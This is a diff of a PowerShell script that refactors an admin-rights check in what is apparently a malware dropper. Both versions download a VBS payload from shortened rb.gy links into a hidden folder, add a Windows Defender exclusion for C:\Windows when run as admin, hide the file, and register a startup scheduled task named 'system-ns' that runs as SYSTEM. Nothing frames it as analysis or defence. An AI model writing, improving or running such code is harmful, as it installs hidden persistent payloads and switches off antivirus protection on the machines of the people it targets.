@@ -1,32 +1,18 @@
-# Function to check for administrative privileges
-function Test-AdminRights {
-    $output = & whoami /priv
-    $privileges = $output | Select-String -Pattern "SeShutdownPrivilege|SeChangeNotifyPrivilege|SeUndockPrivilege|SeIncreaseWorkingSetPrivilege|SeTimeZonePrivilege"
-    $privileges.Count
-}
+# Check if the script is running as an Administrator
+if (([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Output "Running as Administrator"
 
-# Check if the user has more than the normal amount of privileges
-$normalPrivilegeCount = 5 # Number of expected privileges for a non-admin user
-$privilegeCount = Test-AdminRights
-
-if ($privilegeCount -gt $normalPrivilegeCount) {
     # Admin rights detected
-
-    # Installation directory
     $installPath = "C:\Windows"
-    
-    # Download script.vbs for admin users
     $scriptVbsUrl = "https://rb.gy/w3a7hb"
 
     # Windows Defender Exclusion
     Add-MpPreference -ExclusionPath $installPath
 } else {
-    # No admin rights
+    Write-Output "Not running as Administrator"
 
-    # Installation directory
+    # No admin rights
     $installPath = Join-Path $env:USERPROFILE "System"
-    
-    # Download script.vbs for non-admin users
     $scriptVbsUrl = "https://rb.gy/3lld2p"
 }
 
@@ -58,7 +44,7 @@ attrib +H $scriptVbsPath
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
 $trigger = New-ScheduledTaskTrigger -AtStartup
 
-if ($privilegeCount -gt $normalPrivilegeCount) {
+if (([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     # If admin rights, run as NT AUTHORITY\SYSTEM
     $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
 } else {
@@ -68,9 +54,5 @@ if ($privilegeCount -gt $normalPrivilegeCount) {
 
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
 
-# Attempt to register the task and handle errors
-try {
-    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Principal $principal -Settings $settings -Force
-} catch {
-    Write-Output "Failed to register scheduled task: $_"
-}
+# Register the task
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Principal $principal -Settings $settings -Force
